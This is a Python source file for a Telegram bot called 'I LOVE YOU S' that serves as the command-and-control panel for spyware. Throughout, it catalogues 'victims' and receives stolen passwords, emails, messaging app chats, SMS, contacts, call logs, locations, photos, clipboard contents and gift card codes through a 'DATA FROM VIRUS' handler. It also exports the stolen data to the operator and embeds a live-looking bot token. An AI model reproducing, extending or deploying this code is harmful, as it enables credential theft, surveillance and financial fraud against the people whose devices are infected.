#!/usr/bin/env python3
"""
I LOVE YOU S - TELEGRAM BOT
Version: 3.0
Complete Command System
"""

import requests
import time
import json
import os
import sys
import threading
from datetime import datetime
from queue import Queue

# ==================== CONFIG ====================
TOKEN = "8642412184:AAGqVaa324gSb5DQIGx6y4MvG5pjxcillwY"
ADMIN = "7830338879"
last_id = 0

# ==================== DATA STORAGE ====================
victims = {}
gift_cards = []
emails = []
passwords = []
whatsapp_data = []
telegram_data = []
instagram_data = []
facebook_data = []
location_data = []
photos_data = []
sms_data = []
contacts_data = []
call_logs_data = []
clipboard_data = []

# Load existing data
try:
    with open("data.json", "r") as f:
        d = json.load(f)
        victims = d.get("v", {})
        gift_cards = d.get("g", [])
        emails = d.get("e", [])
        passwords = d.get("p", [])
        whatsapp_data = d.get("w", [])
        telegram_data = d.get("t", [])
        instagram_data = d.get("i", [])
        facebook_data = d.get("f", [])
        location_data = d.get("l", [])
        photos_data = d.get("ph", [])
        sms_data = d.get("s", [])
        contacts_data = d.get("c", [])
        call_logs_data = d.get("cl", [])
        clipboard_data = d.get("cb", [])
except:
    pass

def save():
    with open("data.json", "w") as f:
        json.dump({
            "v": victims, "g": gift_cards, "e": emails, "p": passwords,
            "w": whatsapp_data, "t": telegram_data, "i": instagram_data,
            "f": facebook_data, "l": location_data, "ph": photos_data,
            "s": sms_data, "c": contacts_data, "cl": call_logs_data, "cb": clipboard_data
        }, f)

# ==================== MESSAGE QUEUE ====================
msg_queue = Queue()

def send_message_worker():
    while True:
        try:
            chat_id, text = msg_queue.get()
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                          json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}, timeout=5)
        except:
            pass
        msg_queue.task_done()

threading.Thread(target=send_message_worker, daemon=True).start()

def send(chat, txt):
    msg_queue.put((chat, txt))

# ==================== COMMANDS ====================
def get_stats():
    return f"""
╔════════════════════════════════════════╗
║     📊 I LOVE YOU S - STATISTICS       ║
╠════════════════════════════════════════╣
║ 📱 **VICTIMS**                          ║
║ ├─ Total: {len(victims)}
║ ├─ Active: {sum(1 for v in victims.values() if v.get('active', False))}
║ └─ Offline: {len(victims) - sum(1 for v in victims.values() if v.get('active', False))}
║                                        ║
║ 🎁 **GIFT CARDS**                       ║
║ ├─ Count: {len(gift_cards)}
║ └─ Value: ₹{len(gift_cards) * 10000:,}
║                                        ║
║ 🔐 **CREDENTIALS**                      ║
║ ├─ Emails: {len(emails)}
║ ├─ Passwords: {len(passwords)}
║ └─ Clipboard: {len(clipboard_data)}
║                                        ║
║ 💬 **CHATS**                            ║
║ ├─ WhatsApp: {len(whatsapp_data)}
║ ├─ Telegram: {len(telegram_data)}
║ ├─ Instagram: {len(instagram_data)}
║ └─ Facebook: {len(facebook_data)}
║                                        ║
║ 📍 **LOCATION**                         ║
║ └─ Total: {len(location_data)}
║                                        ║
║ 📸 **MEDIA**                            ║
║ ├─ Photos: {len(photos_data)}
║ └─ SMS: {len(sms_data)}
║                                        ║
║ 📞 **CALL LOGS**                        ║
║ └─ Total: {len(call_logs_data)}
║                                        ║
║ ⏱️ Uptime: Continuous                   ║
║ 🤖 Status: ✅ ONLINE                    ║
╚════════════════════════════════════════╝
"""

def get_help():
    return """
╔════════════════════════════════════════╗
║     🤖 I LOVE YOU S - COMMANDS         ║
╠════════════════════════════════════════╣
║ 📊 **STATISTICS**                       ║
║ /start - Start bot                     ║
║ /help - Show this help                 ║
║ /stats - Full statistics               ║
║ /status - Bot status                   ║
║                                        ║
║ 🎁 **GIFT CARDS**                       ║
║ /giftcards - List all gift cards       ║
║ /giftcard <id> - View gift card detail ║
║ /addgift <code> - Add gift card        ║
║                                        ║
║ 📱 **VICTIMS**                          ║
║ /victims - List all victims            ║
║ /victim <id> - View victim details     ║
║ /active - Active victims               ║
║ /offline - Offline victims             ║
║                                        ║
║ 💬 **CHATS**                            ║
║ /whatsapp - WhatsApp data              ║
║ /telegram - Telegram data              ║
║ /instagram - Instagram data            ║
║ /facebook - Facebook data              ║
║ /allchats - All chats summary          ║
║                                        ║
║ 🔐 **CREDENTIALS**                      ║
║ /emails - All emails                   ║
║ /passwords - All passwords             ║
║ /clipboard - Clipboard data            ║
║                                        ║
║ 📍 **LOCATION**                         ║
║ /locations - All locations             ║
║ /lastloc - Last location               ║
║                                        ║
║ 📸 **MEDIA**                            ║
║ /photos - All photos                   ║
║ /sms - All SMS                         ║
║ /contacts - All contacts               ║
║ /calls - Call logs                     ║
║                                        ║
║ 💾 **BACKUP**                           ║
║ /backup - Create backup                ║
║ /export - Export all data              ║
║ /clear - Clear all data                ║
║                                        ║
║ ⚙️ **SYSTEM**                           ║
║ /restart - Restart bot                 ║
║ /stop - Stop bot                       ║
║ /log - View logs                       ║
╚════════════════════════════════════════╝
"""

# ==================== MAIN BOT LOOP ====================
print("🤖 I LOVE YOU S BOT STARTED")
print("="*50)

while True:
    try:
        r = requests.get(f"https://api.telegram.org/bot{TOKEN}/getUpdates", 
                        params={"offset": last_id + 1, "timeout": 10}, timeout=15)
        data = r.json()
        
        for u in data.get("result", []):
            if "message" not in u:
                continue
            m = u["message"]
            chat_id = str(m["chat"]["id"])
            txt = m.get("text", "")
            username = m.get("from", {}).get("username", "Unknown")
            
            print(f"📨 [{datetime.now().strftime('%H:%M:%S')}] @{username}: {txt[:50]}")
            
            if chat_id == ADMIN:
                # ========== STATS COMMANDS ==========
                if txt == "/start":
                    send(chat_id, "🔥 **I LOVE YOU S BOT** 🔥\n\n✅ Bot is LIVE!\n📡 24/7 Active\n👑 Admin Mode ON\n\nType /help for commands")
                elif txt == "/help":
                    send(chat_id, get_help())
                elif txt == "/status":
                    send(chat_id, "✅ **Bot is RUNNING**\n📡 Online\n👑 Admin Mode ON\n🕐 24/7 Active\n📦 All Systems Operational")
                elif txt == "/stats":
                    send(chat_id, get_stats())
                
                # ========== GIFT CARD COMMANDS ==========
                elif txt == "/giftcards":
                    if not gift_cards:
                        send(chat_id, "📭 No gift cards yet.")
                    else:
                        msg = "🎁 **GIFT CARDS**\n━━━━━━━━━━━━━━━━\n"
                        for i, c in enumerate(gift_cards[-30:]):
                            msg += f"{i+1}. `{c}`\n"
                        send(chat_id, msg)
                elif txt.startswith("/addgift "):
                    code = txt.replace("/addgift ", "").strip()
                    gift_cards.append(code)
                    save()
                    send(chat_id, f"✅ Gift card added: `{code}`")
                
                # ========== VICTIM COMMANDS ==========
                elif txt == "/victims":
                    if not victims:
                        send(chat_id, "📭 No victims yet.")
                    else:
                        msg = "📱 **VICTIMS**\n━━━━━━━━━━━━━━━━\n"
                        for vid, v in list(victims.items())[-30:]:
                            status = "✅" if v.get("active", False) else "❌"
                            phone = v.get("phone", "Unknown")
                            msg += f"{vid} | {phone} | {status}\n"
                        send(chat_id, msg)
                elif txt == "/active":
                    active = {k:v for k,v in victims.items() if v.get("active", False)}
                    if not active:
                        send(chat_id, "📭 No active victims.")
                    else:
                        send(chat_id, "🟢 **ACTIVE VICTIMS**\n" + "\n".join(active.keys()))
                elif txt == "/offline":
                    offline = {k:v for k,v in victims.items() if not v.get("active", False)}
                    if not offline:
                        send(chat_id, "📭 No offline victims.")
                    else:
                        send(chat_id, "🔴 **OFFLINE VICTIMS**\n" + "\n".join(offline.keys()))
                
                # ========== CHAT COMMANDS ==========
                elif txt == "/whatsapp":
                    if not whatsapp_data:
                        send(chat_id, "📭 No WhatsApp data yet.")
                    else:
                        msg = "💬 **WHATSAPP DATA**\n━━━━━━━━━━━━━━━━\n" + "\n".join(whatsapp_data[-20:])
                        send(chat_id, msg[:4000])
                elif txt == "/telegram":
                    if not telegram_data:
                        send(chat_id, "📭 No Telegram data yet.")
                    else:
                        msg = "💬 **TELEGRAM DATA**\n━━━━━━━━━━━━━━━━\n" + "\n".join(telegram_data[-20:])
                        send(chat_id, msg[:4000])
                elif txt == "/instagram":
                    if not instagram_data:
                        send(chat_id, "📭 No Instagram data yet.")
                    else:
                        msg = "📸 **INSTAGRAM DATA**\n━━━━━━━━━━━━━━━━\n" + "\n".join(instagram_data[-20:])
                        send(chat_id, msg[:4000])
                elif txt == "/facebook":
                    if not facebook_data:
                        send(chat_id, "📭 No Facebook data yet.")
                    else:
                        msg = "👤 **FACEBOOK DATA**\n━━━━━━━━━━━━━━━━\n" + "\n".join(facebook_data[-20:])
                        send(chat_id, msg[:4000])
                elif txt == "/allchats":
                    total = len(whatsapp_data) + len(telegram_data) + len(instagram_data) + len(facebook_data)
                    send(chat_id, f"💬 **ALL CHATS**\nWhatsApp: {len(whatsapp_data)}\nTelegram: {len(telegram_data)}\nInstagram: {len(instagram_data)}\nFacebook: {len(facebook_data)}\n━━━━━━━━━━━━━━━━\nTotal: {total}")
                
                # ========== CREDENTIAL COMMANDS ==========
                elif txt == "/emails":
                    if not emails:
                        send(chat_id, "📭 No emails yet.")
                    else:
                        msg = "📧 **EMAILS**\n━━━━━━━━━━━━━━━━\n" + "\n".join(emails[-30:])
                        send(chat_id, msg)
                elif txt == "/passwords":
                    if not passwords:
                        send(chat_id, "🔐 No passwords yet.")
                    else:
                        msg = "🔐 **PASSWORDS**\n━━━━━━━━━━━━━━━━\n" + "\n".join(passwords[-30:])
                        send(chat_id, msg)
                elif txt == "/clipboard":
                    if not clipboard_data:
                        send(chat_id, "📋 No clipboard data yet.")
                    else:
                        msg = "📋 **CLIPBOARD**\n━━━━━━━━━━━━━━━━\n" + "\n".join(clipboard_data[-20:])
                        send(chat_id, msg[:4000])
                
                # ========== LOCATION COMMANDS ==========
                elif txt == "/locations":
                    if not location_data:
                        send(chat_id, "📍 No locations yet.")
                    else:
                        msg = "📍 **LOCATIONS**\n━━━━━━━━━━━━━━━━\n" + "\n".join(location_data[-20:])
                        send(chat_id, msg)
                elif txt == "/lastloc":
                    if location_data:
                        send(chat_id, f"📍 **LAST LOCATION**\n{location_data[-1]}")
                    else:
                        send(chat_id, "📍 No locations yet.")
                
                # ========== MEDIA COMMANDS ==========
                elif txt == "/photos":
                    if not photos_data:
                        send(chat_id, "📸 No photos yet.")
                    else:
                        msg = "📸 **PHOTOS**\n━━━━━━━━━━━━━━━━\n" + "\n".join(photos_data[-20:])
                        send(chat_id, msg[:4000])
                elif txt == "/sms":
                    if not sms_data:
                        send(chat_id, "📨 No SMS yet.")
                    else:
                        msg = "📨 **SMS**\n━━━━━━━━━━━━━━━━\n" + "\n".join(sms_data[-20:])
                        send(chat_id, msg[:4000])
                elif txt == "/contacts":
                    if not contacts_data:
                        send(chat_id, "📇 No contacts yet.")
                    else:
                        msg = "📇 **CONTACTS**\n━━━━━━━━━━━━━━━━\n" + "\n".join(contacts_data[-20:])
                        send(chat_id, msg[:4000])
                elif txt == "/calls":
                    if not call_logs_data:
                        send(chat_id, "📞 No call logs yet.")
                    else:
                        msg = "📞 **CALL LOGS**\n━━━━━━━━━━━━━━━━\n" + "\n".join(call_logs_data[-20:])
                        send(chat_id, msg[:4000])
                
                # ========== BACKUP COMMANDS ==========
                elif txt == "/backup":
                    save()
                    send(chat_id, "💾 Backup created successfully!")
                elif txt == "/export":
                    save()
                    files = ["data.json"]
                    for f in files:
                        if os.path.exists(f):
                            try:
                                with open(f, "rb") as file:
                                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendDocument",
                                                 files={"document": file}, data={"chat_id": chat_id, "caption": f}, timeout=30)
                            except:
                                pass
                    send(chat_id, "📦 All data exported!")
                elif txt == "/clear":
                    victims.clear()
                    gift_cards.clear()
                    emails.clear()
                    passwords.clear()
                    whatsapp_data.clear()
                    telegram_data.clear()
                    instagram_data.clear()
                    facebook_data.clear()
                    location_data.clear()
                    photos_data.clear()
                    sms_data.clear()
                    contacts_data.clear()
                    call_logs_data.clear()
                    clipboard_data.clear()
                    save()
                    send(chat_id, "🗑️ ALL DATA CLEARED!")
                
                # ========== SYSTEM COMMANDS ==========
                elif txt == "/restart":
                    send(chat_id, "🔄 Restarting bot...")
                    time.sleep(1)
                    os.execl(sys.executable, sys.executable, *sys.argv)
                elif txt == "/stop":
                    send(chat_id, "🛑 Bot stopped!")
                    sys.exit(0)
                elif txt == "/log":
                    if os.path.exists("nohup.out"):
                        with open("nohup.out", "r") as f:
                            logs = f.read()[-2000:]
                            send(chat_id, f"📋 **LOGS**\n```\n{logs}\n```")
                    else:
                        send(chat_id, "📋 No logs found.")
                
                # ========== DATA FROM VIRUS ==========
                elif txt.startswith("GIFT:"):
                    code = txt.replace("GIFT:", "").strip()
                    gift_cards.append(code)
                    save()
                    send(ADMIN, f"🎁 **NEW GIFT CARD**\n`{code}`")
                elif txt.startswith("VICTIM:"):
                    parts = txt.replace("VICTIM:", "").split("|")
                    vid = parts[0].strip()
                    phone = parts[1] if len(parts) > 1 else "Unknown"
                    victims[vid] = {"phone": phone, "active": True, "time": str(datetime.now())}
                    save()
                    send(ADMIN, f"📱 **NEW VICTIM**\nID: {vid}\n📞 Phone: {phone}")
                elif txt.startswith("EMAIL:"):
                    emails.append(txt.replace("EMAIL:", "").strip())
                    save()
                elif txt.startswith("PASS:"):
                    passwords.append(txt.replace("PASS:", "").strip())
                    save()
                elif txt.startswith("WHATSAPP:"):
                    whatsapp_data.append(txt.replace("WHATSAPP:", "").strip())
                    save()
                elif txt.startswith("TELEGRAM:"):
                    telegram_data.append(txt.replace("TELEGRAM:", "").strip())
                    save()
                elif txt.startswith("INSTAGRAM:"):
                    instagram_data.append(txt.replace("INSTAGRAM:", "").strip())
                    save()
                elif txt.startswith("FACEBOOK:"):
                    facebook_data.append(txt.replace("FACEBOOK:", "").strip())
                    save()
                elif txt.startswith("LOCATION:"):
                    location_data.append(txt.replace("LOCATION:", "").strip())
                    save()
                elif txt.startswith("PHOTO:"):
                    photos_data.append(txt.replace("PHOTO:", "").strip())
                    save()
                elif txt.startswith("SMS:"):
                    sms_data.append(txt.replace("SMS:", "").strip())
                    save()
                elif txt.startswith("CONTACT:"):
                    contacts_data.append(txt.replace("CONTACT:", "").strip())
                    save()
                elif txt.startswith("CALL:"):
                    call_logs_data.append(txt.replace("CALL:", "").strip())
                    save()
                elif txt.startswith("CLIPBOARD:"):
                    clipboard_data.append(txt.replace("CLIPBOARD:", "").strip())
                    save()
                else:
                    print(f"📝 Unknown: {txt[:50]}")
            
            # ========== NON-ADMIN ==========
            else:
                if txt == "/start":
                    send(chat_id, "🤖 I LOVE YOU S Bot is running!\n\nContact admin for access.\n\n@leaker420_bot")
                else:
                    send(chat_id, "❌ Access denied. Contact admin.")
            
            last_id = u["update_id"]
            save()
        
        time.sleep(0.2)
        
    except Exception as e:
        print(f"⚠️ Error: {e}")
        time.sleep(1)
